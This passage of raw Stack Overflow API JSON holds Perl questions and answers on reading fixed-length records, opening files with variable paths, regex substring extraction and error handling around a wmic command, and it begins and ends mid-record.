"https://stackoverflow.com/users/4995259/criz"}, "edited": false, "score": 0, "creation_date": 1496402685, "post_id": 44305245, "comment_id": 75659562, "body": "The for loop above I mentioned works above but I had to modify it as my $record = substr($data, $j, 25, -1);"}, {"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "edited": false, "score": 1, "creation_date": 1496652283, "post_id": 44305245, "comment_id": 75731333, "body": "Made an error in my record count. Works great thanks!"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 4, "last_activity_date": 1496313366, "creation_date": 1496313366, "answer_id": 44305245, "question_id": 44305003, "link": "https://stackoverflow.com/questions/44305003/efficiently-loop-through-a-file-with-a-fixed-length-record-string-using-perl/44305245#44305245", "title": "Efficiently loop through a file with a fixed length record string using Perl", "body": "<p>You can use <a href=\"https://perldoc.perl.org/functions/read.html\" rel=\"nofollow noreferrer\"><code>read</code></a> to read a specific number of <em>characters</em> from a file handle.</p>\n\n<blockquote>\n  <p>Attempts to read LENGTH characters of data into variable SCALAR from the specified FILEHANDLE. Returns the number of characters actually read, 0 at end of file, or undef if there was an error (in the latter case $! is also set). SCALAR will be grown or shrunk so that the last character actually read is the last character of the scalar after the read.</p>\n</blockquote>\n\n<p>Here's a short example.</p>\n\n<pre><code>while (read(\\*DATA, my $record, 3)) {\n    print $record, \"\\n\";\n}\n\n__DATA__\nfoobarbazqrr\n</code></pre>\n\n<p>This will output</p>\n\n<pre><code>foo\nbar\nbaz\nqrr\n</code></pre>\n\n<hr>\n\n<p>If you read the whole file (as one line) at once, the space you would take up in memory would be at the size of the entire file. It would only be double the size of reading one record at a time if the file only has two very long records.</p>\n"}, {"comments": [{"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "edited": false, "score": 0, "creation_date": 1496394907, "post_id": 44305349, "comment_id": 75654852, "body": "Thanks! This is what I meant with regards to memory consumption."}], "tags": [], "owner": {"reputation": 11905, "user_id": 2897372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e114bd942d7cc21603ae50d2e73d81?s=128&d=identicon&r=PG", "display_name": "B\u0142otosm\u0119tek", "link": "https://stackoverflow.com/users/2897372/b%c5%82otosm%c4%99tek"}, "is_accepted": false, "score": 2, "last_activity_date": 1496314664, "last_edit_date": 1496314664, "creation_date": 1496313660, "answer_id": 44305349, "question_id": 44305003, "link": "https://stackoverflow.com/questions/44305003/efficiently-loop-through-a-file-with-a-fixed-length-record-string-using-perl/44305349#44305349", "title": "Efficiently loop through a file with a fixed length record string using Perl", "body": "<p>Your assumption is partly true. Reading the whole file into memory will require as much memory as the file itself uses. For example, if your file is 100 MB, reading it into memory will increase your memory use by 100 MB. This does not mean <em>twice</em>, because just opening the file does not require 100 MB. </p>\n\n<p>As for the best way of reading the file record-by-record, this is it:</p>\n\n<pre><code>my $record_size = 25;\nopen my $fh, \"&lt;\", \"inputfile.txt\" or die \"can't open file\\n\";\nwhile(read($fh, my $record, $record_size)) {\n    print($record.\"\\n\")\n}\n</code></pre>\n\n<p>Also, consider opening your file in binary mode if it contains anything else but text.</p>\n"}, {"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496315609, "post_id": 44305940, "comment_id": 75617067, "body": "We discussed this approach briefly in the comments on my answer. Maybe you can answer \u0421\u0443\u0445\u043e\u043927&#39;s question there."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496316136, "post_id": 44305940, "comment_id": 75617404, "body": "Not off the top of my head, as my &#39;testing-for-SO&#39; setup doesn&#39;t really do UTF-8 meaningfully.   I&#39;ll see if I can fettle it into a workable form. It <i>does</i> say &quot;characters&quot; rather than &quot;bytes&quot; though."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496316357, "post_id": 44305940, "comment_id": 75617540, "body": "Is your setup more elaborate than my <i>scratch.pl</i> file that keeps getting bigger with every question? :)"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496320563, "post_id": 44305940, "comment_id": 75620584, "body": "Well, more that TextPad on Windows doesn&#39;t do UTF-8 all that well, and my Linux environment is network-isolated."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496320914, "post_id": 44305940, "comment_id": 75620864, "body": "I used to use PSPad when I was on Windows, which did all kinds of encoding really well, until I switched to Komodo IDE, which I took with me to Linux."}, {"owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "edited": false, "score": 0, "creation_date": 1496628194, "post_id": 44305940, "comment_id": 75723230, "body": "I couldn&#39;t use this since my record separator is stored in a variable. local $/ = \\$rowcount;"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 4, "last_activity_date": 1496315425, "creation_date": 1496315425, "answer_id": 44305940, "question_id": 44305003, "link": "https://stackoverflow.com/questions/44305003/efficiently-loop-through-a-file-with-a-fixed-length-record-string-using-perl/44305940#44305940", "title": "Efficiently loop through a file with a fixed length record string using Perl", "body": "<p>As it's not mentioned yet - check out <code>$/</code> - the record separator.</p>\n\n<p>By default, it's linefeed <code>\"\\n\"</code> and you read a file line by line.</p>\n\n<p>However, you can set it to a <em>reference</em> to a numeric value - it has to be a reference, so it doesn't treat the literal string '25' as the delimiter. </p>\n\n<p>Like so:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\n\nlocal $/ = \\25;\n\nwhile ( &lt;DATA&gt; ) {\n   print;\n   print \"\\n-- end of record --\\n\";\n}\n\n__DATA__\n1234567890123456\n12345636734345345345q34523 3 2134234213 35r25253 25252 2524gfartw345sadgw54723wqu745ewsdf\n</code></pre>\n"}], "owner": {"reputation": 263, "user_id": 4995259, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c4d0fa9012306fa48b9ef275998c4a18?s=128&d=identicon&r=PG&f=1", "display_name": "criz", "link": "https://stackoverflow.com/users/4995259/criz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 334, "favorite_count": 2, "accepted_answer_id": 44305245, "answer_count": 3, "score": 2, "last_activity_date": 1496628081, "creation_date": 1496312710, "last_edit_date": 1496628051, "question_id": 44305003, "link": "https://stackoverflow.com/questions/44305003/efficiently-loop-through-a-file-with-a-fixed-length-record-string-using-perl", "title": "Efficiently loop through a file with a fixed length record string using Perl", "body": "<p>I have a file that has a fixed length record with no newline characters.</p>\n\n<p>Example: A file with 100 characters that has a fixed length record of 25 characters. (total of 4 records)</p>\n\n<p>How can I read the file per record without having to store the data in a variable. (please see example below)</p>\n\n<pre><code>open my $fh, \"&lt;\", \"inputfile.txt\" or die \"can't open file\\n\";\n\nmy $data = &lt;$fh&gt;; # I would like to avoid storing the file contents in a variable\n\nfor (my $j = 0; $j &lt; length $data; $j += 25 ) {\n\n    my $record = substr($data, $j, 25) # Get one record\n    print \"$record\\n\";\n\n\n}\n</code></pre>\n\n<p>2nd option:</p>\n\n<p>I can also use $_ to capture the data in . Am I doing the same thing as above in terms of consuming additional memory? </p>\n\n<pre><code>open my $fh, \"&lt;\", \"inputfile.txt\" or die \"can't open file\\n\";\n\nwhile ( &lt;$fh&gt; ) {\n\n    for (my $j = 0; $j &lt; length $_; $j += 25 ) {\n\n        my $record = substr($_, $j, 25) # Get one record\n        print \"$record\\n\";\n    }\n}\n</code></pre>\n\n<p>The reason that I do not wan't to store it in a variable because I am concerned that if I am dealing with a very large file, it would consume twice as space as opening the file. </p>\n\n<p>Am I making the correct assumption that I would be taking twice the space in memory as I did when I opened the file?</p>\n\n<p>What would be the most efficient way to read the file wihtout having to consume a lot of memory?</p>\n\n<p>Please correct me if my question does not make sense.</p>\n\n<p>Thanks :)</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1496304098, "post_id": 44301779, "comment_id": 75608842, "body": "Use three-argument open: <code>open my $fh, &#39;&lt;&#39;, $file or die &quot;Can&#39;t open $file: $!&quot;;</code>. You can then of course say <code>open my $fh, &#39;&lt;&#39;, &quot;&#47;path&#47;$line&#47;etc&quot;</code>"}, {"owner": {"reputation": 17619, "user_id": 7818749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4a72453e116debb802d55e88c2572e?s=128&d=identicon&r=PG&f=1", "display_name": "Gerhard", "link": "https://stackoverflow.com/users/7818749/gerhard"}, "edited": false, "score": 0, "creation_date": 1496304107, "post_id": 44301779, "comment_id": 75608847, "body": "are you trying to automatically read the name from path by using $line? Or are you declaring an array of names and passing each of them to a scalar?"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1496304140, "post_id": 44301779, "comment_id": 75608877, "body": "<code>my $file = &quot;C:&#47;Users&#47;admin&#47;Documents&#47;Projects&#47;$line&#47;project.txt&quot;; open($in, &quot;&lt;&quot;, $file) or die &quot;blah blah...!\\n&quot;;</code>"}, {"owner": {"reputation": 539, "user_id": 7162389, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wr6Gu.jpg?s=128&g=1", "display_name": "Harini", "link": "https://stackoverflow.com/users/7162389/harini"}, "edited": false, "score": 0, "creation_date": 1496306170, "post_id": 44301779, "comment_id": 75610170, "body": "Try this:    open(FL, &quot;&lt;C:/Users/admin/Documents/Projects/&quot;@{[$line]}&quot;/project.txt&zwnj;&#8203;&quot;) or die &quot;Could not open file $!&quot;;"}, {"owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "edited": false, "score": 1, "creation_date": 1496307452, "post_id": 44301779, "comment_id": 75611092, "body": "<code>$line = qutoemeta($line); open (..</code> try this one"}, {"owner": {"reputation": 303, "user_id": 7745725, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5Gu6N.png?s=128&g=1", "display_name": "Vinay Verma", "link": "https://stackoverflow.com/users/7745725/vinay-verma"}, "reply_to_user": {"reputation": 17619, "user_id": 7818749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4a72453e116debb802d55e88c2572e?s=128&d=identicon&r=PG&f=1", "display_name": "Gerhard", "link": "https://stackoverflow.com/users/7818749/gerhard"}, "edited": false, "score": 0, "creation_date": 1496309512, "post_id": 44301779, "comment_id": 75612655, "body": "@Gerhard, yes I put all the project names in one file and after reading, generating an array and then proceeding further."}, {"owner": {"reputation": 303, "user_id": 7745725, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5Gu6N.png?s=128&g=1", "display_name": "Vinay Verma", "link": "https://stackoverflow.com/users/7745725/vinay-verma"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496309794, "post_id": 44301779, "comment_id": 75612878, "body": "@zdim and ssr1012  I tried both the ways already."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1496337184, "post_id": 44301779, "comment_id": 75632440, "body": "@VinayVerma  OK, you found what it was and that is great. But I&#39;d like to emphasize -- the three argument open is just better to use, for a number of reasons. In general."}], "answers": [{"comments": [{"owner": {"reputation": 303, "user_id": 7745725, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5Gu6N.png?s=128&g=1", "display_name": "Vinay Verma", "link": "https://stackoverflow.com/users/7745725/vinay-verma"}, "edited": false, "score": 0, "creation_date": 1496309674, "post_id": 44302114, "comment_id": 75612796, "body": "Yes, I used chomp. still not getting output as expected. I while calling $line, I can am able to work on first project in the list successfully but for all the other projects it is still failing."}], "tags": [], "owner": {"reputation": 11905, "user_id": 2897372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e114bd942d7cc21603ae50d2e73d81?s=128&d=identicon&r=PG", "display_name": "B\u0142otosm\u0119tek", "link": "https://stackoverflow.com/users/2897372/b%c5%82otosm%c4%99tek"}, "is_accepted": true, "score": 4, "last_activity_date": 1496304994, "creation_date": 1496304994, "answer_id": 44302114, "question_id": 44301779, "link": "https://stackoverflow.com/questions/44301779/issue-while-opening-the-file-in-perl/44302114#44302114", "title": "Issue while opening the file in Perl", "body": "<p>Are you reading your project names from another file? If so, did you remember to remove <code>\\n</code> at the end (using <code>chomp $line</code> or similar)? </p>\n"}, {"comments": [{"owner": {"reputation": 303, "user_id": 7745725, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5Gu6N.png?s=128&g=1", "display_name": "Vinay Verma", "link": "https://stackoverflow.com/users/7745725/vinay-verma"}, "edited": false, "score": 1, "creation_date": 1496310141, "post_id": 44303622, "comment_id": 75613149, "body": "Yes, It was only saying that the file cannot be opened. well, <a href=\"https://stackoverflow.com/a/44302114/7745725\">stackoverflow.com/a/44302114/7745725</a> solution worked for me :-) Thanks!"}], "tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": false, "score": 1, "last_activity_date": 1496309498, "last_edit_date": 1496309498, "creation_date": 1496309143, "answer_id": 44303622, "question_id": 44301779, "link": "https://stackoverflow.com/questions/44301779/issue-while-opening-the-file-in-perl/44303622#44303622", "title": "Issue while opening the file in Perl", "body": "<p>Suppose your <code>$line</code> having some special character it won't allow, so we shopuld escape the character, use <a href=\"http://perldoc.perl.org/functions/quotemeta.html\" rel=\"nofollow noreferrer\">quotemeta</a></p>\n\n<pre><code>$line = qutoemeta($line); \nopen  my $fh, \"&lt;\" ,$line or die \"Error opening $!\";\n</code></pre>\n\n<p>You will fix the error by <code>$!</code>. Already you have added it in your code. \nPlease follow what it is saying. </p>\n"}], "owner": {"reputation": 303, "user_id": 7745725, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/5Gu6N.png?s=128&g=1", "display_name": "Vinay Verma", "link": "https://stackoverflow.com/users/7745725/vinay-verma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 110, "favorite_count": 0, "accepted_answer_id": 44302114, "answer_count": 2, "score": 0, "last_activity_date": 1496309498, "creation_date": 1496303904, "question_id": 44301779, "link": "https://stackoverflow.com/questions/44301779/issue-while-opening-the-file-in-perl", "title": "Issue while opening the file in Perl", "body": "<p>I am trying to open a file using perl command. When I am passing a variable in between the file path, perl is not able to open the file: (here <em>$line</em>)</p>\n\n<pre><code>open(FL, \"&lt;C:/Users/admin/Documents/Projects/$line/project.txt\") or die \"Could not open file $!\";\n</code></pre>\n\n<p>and If I try to open the file by passing the full path instead of variable <strong>($line)</strong> in the path, Perl is able to open the file successfully:</p>\n\n<pre><code>open(FL, \"&lt;C:/Users/admin/Documents/Projects/projectName/project.txt\") or die \"Could not open file $!\";\n</code></pre>\n\n<p>Could somebody please guide me how to achieve this. I have a list of projects and I cannnot pass name of every project manually but I need to achieve this by passing <strong>projectName</strong>s as the variables <strong>$line</strong>.</p>\n\n<p>NOTE: All the <strong><em>$line</em></strong> variables are my <strong><em>projectName</strong>s</em>.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1496303520, "post_id": 44301581, "comment_id": 75608479, "body": "What do you mean? Do you want to remove the exclamation mark from the beginning of a string?"}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 3, "last_activity_date": 1496311299, "last_edit_date": 1496311299, "creation_date": 1496303544, "answer_id": 44301664, "question_id": 44301581, "link": "https://stackoverflow.com/questions/44301581/perl-regex-substring/44301664#44301664", "title": "perl regex substring", "body": "<p>To match strings that start with a <code>!</code> you need this pattern. The <code>^</code> is the anchor at the beginning of the string.</p>\n\n<pre><code>/^!/\n</code></pre>\n\n<p>If you want to capture the stuff after the <code>!</code>, you need this pattern. The parenthesis <code>()</code> are a <em>capture group</em>. They tell Perl to grab everything between them and keep it. The <code>.</code> means <em>any character</em>, and the <code>+</code> is a quantifier for <em>as many as possible, at least one</em>. So <code>.+</code> means <em>grab everything</em>.</p>\n\n<pre><code>/^!(.+)/\n</code></pre>\n\n<p>To apply it, do this.</p>\n\n<pre><code>$str =~ m/^!(.+)/;\n</code></pre>\n\n<p>And to get the <code>\"bypass\"</code> out of that pattern, use the <code>$1</code> match variable that was assigned automatically by Perl with the <code>m//</code> operation.</p>\n\n<pre><code>print $1; # will print bypass\n</code></pre>\n\n<p>To make that conditional, it would be:</p>\n\n<pre><code>print $1 if $str =~ m/^!(.+)/;\n</code></pre>\n\n<p>The <code>if</code> here is in <a href=\"https://en.wikipedia.org/wiki/Reverse_Polish_notation\" rel=\"nofollow noreferrer\"><em>post-fix notation</em></a>, which lets you omit the block and the parenthesis. It's the same as the following, but shorter and easier to read for single statements.</p>\n\n<pre><code>if ( $str =~ m/^!(.+)/ ) {\n    print $1;\n}\n</code></pre>\n\n<p>If you want to permanently change <code>$str</code> to not have an exclamation mark at the beginning, you need to use a substitution instead.</p>\n\n<pre><code>$str =~ s/^!//;\n</code></pre>\n\n<p>The <code>s///</code> is the substitution operator. It changes <code>$str</code> in place. The original value including the <code>!</code> will be lost. </p>\n"}, {"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496321195, "post_id": 44307239, "comment_id": 75621075, "body": "How would you use the match with <code>\\K</code> in an actual program? What would the logic around it be?"}, {"owner": {"reputation": 24167, "user_id": 7388477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e42e688ade97076d4fdd1939946e7c7b?s=128&d=identicon&r=PG&f=1", "display_name": "Valdi_Bo", "link": "https://stackoverflow.com/users/7388477/valdi-bo"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496325534, "post_id": 44307239, "comment_id": 75624500, "body": "You can program it e.g. as follows:      my $str=&quot;!bypass&quot;;     if ($str =~ /^!\\K.+/) {       print &quot;Match: $&amp;\\n&quot;;     } else {       print &quot;No match\\n&quot;;     } Of course, the matched content is <b>after</b> \\K."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496328820, "post_id": 44307239, "comment_id": 75627185, "body": "You should add that to your answer. It&#39;s a more advanced technique, and I actually didn&#39;t know the <code>\\K</code>."}], "tags": [], "owner": {"reputation": 24167, "user_id": 7388477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e42e688ade97076d4fdd1939946e7c7b?s=128&d=identicon&r=PG&f=1", "display_name": "Valdi_Bo", "link": "https://stackoverflow.com/users/7388477/valdi-bo"}, "is_accepted": false, "score": 1, "last_activity_date": 1496319172, "creation_date": 1496319172, "answer_id": 44307239, "question_id": 44301581, "link": "https://stackoverflow.com/questions/44301581/perl-regex-substring/44307239#44307239", "title": "perl regex substring", "body": "<p>Use <code>^!\\K.+</code>.</p>\n\n<p>It works this way:</p>\n\n<ul>\n<li><code>^!</code> - Match initial <code>!</code> (but this will soon change, see below).</li>\n<li><code>\\K</code> - <em>Keep</em> - \"forget\" about what you have matched so far and set the starting point of the match here (after the <code>!</code>).</li>\n<li><code>.+</code> - Match non-empty sequence of chars.</li>\n</ul>\n\n<p>Due to <code>\\K</code>, only the last part (<code>.+</code>) is actually matched.</p>\n"}], "owner": {"reputation": 59, "user_id": 5243670, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2c9439ebc672d3a1760414587a73dbb?s=128&d=identicon&r=PG&f=1", "display_name": "alex", "link": "https://stackoverflow.com/users/5243670/alex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 163, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1496319172, "creation_date": 1496303330, "last_edit_date": 1496303409, "question_id": 44301581, "link": "https://stackoverflow.com/questions/44301581/perl-regex-substring", "title": "perl regex substring", "body": "<pre><code>$str=\"!bypass\";\n</code></pre>\n\n<p>I need return string that only start with regex \"!\"\nHow can I return bypass ?</p>\n"}, {"tags": ["perl", "wmic"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 2, "creation_date": 1496301202, "post_id": 44300645, "comment_id": 75606899, "body": "The <code>$?</code> (<a href=\"http://perldoc.perl.org/perlvar.html#%24CHILD_ERROR\" rel=\"nofollow noreferrer\">$CHILD_ERROR</a>) gives the status. It should be zero if all went well.  Read <a href=\"http://perldoc.perl.org/perlvar.html#Error-Variables\" rel=\"nofollow noreferrer\">in perlvar</a>"}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 1, "last_activity_date": 1496301310, "creation_date": 1496301310, "answer_id": 44300912, "question_id": 44300645, "link": "https://stackoverflow.com/questions/44300645/unable-to-get-the-error-and-check-if-it-exist/44300912#44300912", "title": "Unable to get the error and check if it exist", "body": "<p>You need to declare the <code>$opt</code> variable outside of the <code>eval</code> block if you want to use it. You also need to do the <code>next</code> outside of the <code>eval</code> block.</p>\n\n<p>I've changed a bunch of things around your code.</p>\n\n<p>We now declare <code>$opt</code> and <code>$srvername</code> outside of the <code>eval</code>. It's better to scope the <code>eval</code> as small as possible, and creating a string will not fail.</p>\n\n<p>We then call the <code>qx()</code> inside of the <code>eval</code>, and assign <code>$opt</code>, which is scoped inside the <code>foreach</code> block. That way you can access it afterwards.</p>\n\n<p>If the <code>qx</code> fails, we <code>die</code>, which breaks out of the <code>eval</code> block. If you care about the error that <code>qx</code> threw, you can throw <a href=\"http://perldoc.perl.org/perlvar.html#%24%3f\" rel=\"nofollow noreferrer\"><code>$?</code></a>. </p>\n\n<p>After the <code>eval</code> we check <a href=\"http://perldoc.perl.org/perlvar.html#%24%40\" rel=\"nofollow noreferrer\"><code>$@</code></a>, wich holds the eval error. If something is in there (probably our <code>$?</code> from the <code>qx</code>), we go to the <code>next</code> iteration.</p>\n\n<pre><code>my @s = qw( v200 pm363 wq280 );\nforeach my $node ( @s ){\n  my $opt;\n  my $srvername = \"wmic /node: '$node' computersystem get Name\";\n\n  eval {\n    $opt = qx($srvername) or die $?;\n  };\n\n  next if $@;\n\n  print \"$node - opt\\n\";   \n}\n</code></pre>\n\n<p>Note that I also renamed <code>$a</code> to <code>$node</code>. The variable name <code>$a</code> is reserved for <code>sort</code> along with <code>$b</code>. It's also a good idea to give your variables meaningful names that speak for themselves.</p>\n"}], "owner": {"reputation": 13, "user_id": 8096058, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/67d39bede16f7ef3b7317fc281cc72b3?s=128&d=identicon&r=PG&f=1", "display_name": "PopCorn", "link": "https://stackoverflow.com/users/8096058/popcorn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "accepted_answer_id": 44300912, "answer_count": 1, "score": 1, "last_activity_date": 1496301310, "creation_date": 1496300508, "question_id": 44300645, "link": "https://stackoverflow.com/questions/44300645/unable-to-get-the-error-and-check-if-it-exist", "title": "Unable to get the error and check if it exist", "body": "<p>I am trying to access a server and get its name but it is not available how can i deal with the error and continue with the rest of the script.If this command <code>qx($srvername)</code>  returns an error i want to exit the <code>for</code> loop</p>\n\n<pre><code>my @s =qw(v200 pm363   wq280 );\nforeach $a (@s){\n\n  eval {\n  my $srvername=\"wmic /node: '$a' computersystem get Name\";\n  my $opt = qx($srvername) ;\n\n  if($!){ \n     next;\n  }\n };\n\n\nprint \"here$a\\n\";   \n}\n</code></pre>\n"}, {"tags": ["regex", "perl", "increment"], "comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1496305034, "post_id": 44299650, "comment_id": 75609455, "body": "<code>$html =~ s[&lt;p&gt;(.+?)&lt;&#47;p&gt;][&#39;&lt;li value=&quot;&#39;.++$count.&#39;&quot;&gt;&#39;.$1.&#39;&lt;&#47;li&gt;&#39;]esgi;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1496297831, "post_id": 44299711, "comment_id": 75604907, "body": "Can you please explain what you have done?  Is it creating an array or something?"}], "tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": 